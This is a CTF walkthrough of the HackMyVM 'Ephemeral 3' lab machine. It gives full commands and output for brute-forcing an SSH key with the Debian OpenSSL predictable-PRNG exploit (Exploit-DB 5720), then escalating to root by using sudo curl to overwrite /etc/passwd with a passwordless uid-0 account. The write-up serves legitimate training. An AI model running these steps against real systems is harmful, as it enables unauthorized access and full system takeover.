---
title: "Ephemeral 3: HackMyVM Walkthrough"
date: 2024-08-22T13:44:20-08:00
draft: false
description: "This box is exploited using OpenSSL's predictable PRNG to brute-force an SSH key, gaining access as another user. A sudo misconfiguration is then used to modify /etc/passwd, adding a root user, allowing privilege escalation and capturing the final flag."
noindex: false
toc: true
featured: false
pinned: false
comment: true
series:
  - walkthroughs
categories:
#  - 
tags:
#  - 
images: [ephemeral-3.jpg]
#  - 
# menu:
#   main:
#     weight: 100
#     params:
#       icon:
#         vendor: bs
#         name: book
#         color: '#e24d0e'
---

## Introduction

| URL | [https://hackmyvm.eu/machines/machine.php?vm=Ephemeral3](https://hackmyvm.eu/machines/machine.php?vm=Ephemeral3) |
| --- | --- |
| Platform | HackMyVM |
| Difficulty | Medium |

In the "Ephemeral 3" CTF challenge, the exploitation process involved several key techniques and vulnerabilities. Initially, an Nmap scan revealed SSH and HTTP services running on the target machine. Directory enumeration with Gobuster led to the discovery of a note indicating the generation of SSH keys using OpenSSL. Leveraging a known vulnerability in OpenSSL, a predictable PRNG brute-force attack was used to obtain a valid SSH key, allowing access to the system as the user "randy."

Once inside, privilege escalation was achieved by exploiting a sudo misconfiguration that allowed the use of curl as the user "henry." This was used to modify the /etc/passwd file, adding a new user with root privileges. The challenge was successfully completed by accessing the root account and capturing the final flag.

## Walkthrough

Initial `nmap` scan of the box to notice ports 80 and 22 are open

```shell
└─$ nmap -A -sC -p- 192.168.5.123                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 14:05 UTC
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 14:05 (0:00:06 remaining)
Nmap scan report for 192.168.5.123
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:f2:b8:e0:da:41:9b:96:3b:b6:2b:98:95:4c:67:60 (RSA)
|   256 a8:cd:e7:a7:0e:ce:62:86:35:96:02:43:9e:3e:9a:80 (ECDSA)
|_  256 14:a7:57:a9:09:1a:7e:7e:ce:1e:91:f3:b1:1d:1b:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.12 seconds
```

\
Run `gobuster` to discover the `/agency` and `/note.txt` objects:

```shell
└─$ gobuster dir -u http://192.168.5.123 -e -r -x html,htm,asp,aspx,jsp,php,cgi,txt,xml -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
...
http://192.168.5.123/agency               (Status: 200) [Size: 18726]
http://192.168.5.123/index.html           (Status: 200) [Size: 10918]
http://192.168.5.123/index.html           (Status: 200) [Size: 10918]
http://192.168.5.123/note.txt             (Status: 200) [Size: 159]
```

\
Going to http://192.168.5.123/note.txt to see contents:

```html
Hey! I just generated your keys with OpenSSL. You should be able to use your private key now!

If you have any questions just email me at henry@ephemeral.com
```

\
Lets see if we can find OpenSSL and SSH exploit and download it

```shell
└─$ searchsploit openssl         
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
...
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH                                 | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH                                 | linux/remote/5720.py
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH (Ruby)                          | linux/remote/5632.rb
...

└─$ searchsploit -m linux/remote/5720.py     
  Exploit: OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH
      URL: https://www.exploit-db.com/exploits/5720
     Path: /usr/share/exploitdb/exploits/linux/remote/5720.py
    Codes: OSVDB-45029, CVE-2008-3280, CVE-2008-0166
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/5720.py
```

\
Taking a look at the exploit's contents for installation instructions... apparently we need to download preset keys...

```shell
└─$ cat 5720.py        
#!/bin/python
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.
############################################################################
# Autor: hitz - WarCat team (warcat.no-ip.org)
# Collaborator: pretoriano
#
# 1. Download https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
#
# 2. Extract it to a directory
#
# 3. Execute the python script
#     - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
#     - execute: python exploit.py (without parameters) to display the help
#     - if the key is found, the script shows something like that:
#         Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121
#                 Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240
############################################################################
...
```

\
Lets download the keys

```shell
└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2    
--2024-08-11 14:40:21--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 50226987 (48M) [application/octet-stream]
Saving to: ‘5622.tar.bz2’

5622.tar.bz2                           100%[==========================================================================>]  47.90M  57.7MB/s    in 0.8s    

2024-08-11 14:40:22 (57.7 MB/s) - ‘5622.tar.bz2’ saved [50226987/50226987]

└─$ tar -xvf 5622* 
rsa/
rsa/2048/
rsa/2048/2712a6d5cec99f295a0c468b830a370d-28940.pub
rsa/2048/eaddc9bba9bf3c0832f443706903cd14-28712.pub
rsa/2048/0bdcea11b2c628c7fd8bc4b04ca43668-12474
rsa/2048/3fabfedd883c3cef69881a4fc30fdac7-3828.pub
rsa/2048/a508919ec49fcf91ad0ecf8472349d9b-3039.pub
rsa/2048/9ddc1879b9ac311f24a81e835aac5866-28340.pub
...
```

\
Attempted to brute force the key and got a match

```shell
└─$ python2 5720.py rsa/2048 192.168.5.123 randy 

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
...
Key Found in file: 0028ca6d22c68ed0a1e3f6f79573100a-31671
Execute: ssh -lrandy -p22 -i rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 192.168.5.123
Tested 25610 keys | Remaining 7158 keys | Aprox. Speed 4/sec
```

\
Executing the command given to us in the output of the script to login as `randy`

```shell
└─$ ssh -lrandy -p22 -i rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 192.168.5.123
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-30-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

71 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
*** System restart required ***
Last login: Fri Jun 24 01:17:05 2022 from 10.0.0.69
randy@ephemeral:~$
```

\
List commands that can be run with `sudo`

```shell
randy@ephemeral:~$ sudo -l
Matching Defaults entries for randy on ephemeral:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on ephemeral:
    (henry) NOPASSWD: /usr/bin/curl
```

\
Found user flag in the henry home directory

```shell
randy@ephemeral:~$ ls /home/henry
user.txt
 
randy@ephemeral:~$ sudo -u henry /usr/bin/curl file:///home/henry/user.txt
9c8e36<REDACTED>56bca0c3a
```

\
Search for other files owned by `henry` to discover that the henry group has write access to `/etc/passwd`:

```shell
randy@ephemeral:~$ find / -xdev \( -user henry -o -group henry \) -print 2>&1 |grep -v "Permission denied"
```

\
Since we have write access to the `passwd` file, we can add another user in that is apart of the root user and group then overwrite `/etc/passwd` file using curl

```shell
randy@ephemeral:~$ cp /etc/passwd ./passwd
randy@ephemeral:~$ echo "root2::0:0::/home/:/bin/bash" >> ./passwd
randy@ephemeral:~$ sudo -u henry /usr/bin/curl "file:///home/randy/passwd" -o /etc/passwd
randy@ephemeral:~$ su root2
root@ephemeral:/home/randy# whoami
root
root@ephemeral: cat /root/root.txt
b0a3dec<REDACTED>062cec4d
```
